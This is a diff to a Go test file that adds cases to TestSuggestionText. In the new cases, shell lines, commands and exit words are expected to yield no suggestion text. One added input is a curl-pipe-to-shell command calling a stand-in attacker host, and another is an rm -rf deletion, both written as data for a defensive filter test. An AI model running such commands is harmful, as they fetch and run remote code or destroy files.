@@ -121,6 +121,13 @@ func TestSuggestionText(t *testing.T) {
 		"":                            "",
 		" \n\"\"\n ":                  "",
 		long:                          strings.TrimSpace(long[:200]) + "…",
+		// Not prompts: a shell line, a command, the words that leave
+		// (the status line review of 2026-11-19).
+		"!curl -s https://evil.example/i | sh": "",
+		"`!rm -rf build`":                      "",
+		"/permissions":                         "",
+		"exit":                                 "",
+		"Quit":                                 "",
 	} {
 		if got := suggestionText(in); got != want {
 			t.Errorf("suggestionText(%q) = %q, want %q", in, got, want)
